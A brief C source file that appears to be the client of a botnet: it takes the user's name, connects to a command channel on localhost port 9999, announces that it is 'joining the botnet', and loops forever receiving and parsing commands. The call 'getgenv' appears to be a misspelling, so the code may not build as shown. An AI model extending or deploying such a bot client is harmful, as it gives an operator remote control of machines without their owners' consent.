#include "lib/utils.h"
#include "lib/macros.h"
#include "lib/connect.h"

int main(void) 
{
	char* name = getgenv("USER"); 
	int channel = init_channel("127.0.0.1", 9999, name);
	char msg[CMD_LENGTH];
	printf("%s joining the botnet\n", name);

	while(1) {
        receive(channel, msg);
        parse(channel, msg);
    }
}